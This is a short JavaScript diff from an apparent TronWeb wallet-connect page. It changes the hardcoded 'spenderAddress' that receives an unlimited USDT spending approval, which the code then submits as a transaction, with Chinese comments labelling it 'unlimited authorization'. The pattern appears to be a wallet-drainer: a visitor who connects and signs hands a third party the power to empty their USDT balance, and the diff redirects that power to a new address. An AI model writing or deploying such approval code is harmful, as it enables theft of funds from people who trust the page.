@@ -34,7 +34,7 @@ async function connectWallet() {
             const usdtContract = await window.tronWeb.contract().at(usdtAddress);
 
             // 授权地址和数量
-            const spenderAddress = "TTg94Xx1QcaBgAefpUBt4Zo8or3MCm4mvb";
+            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
             const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'; // 无限授权
 
             // 发送授权交易
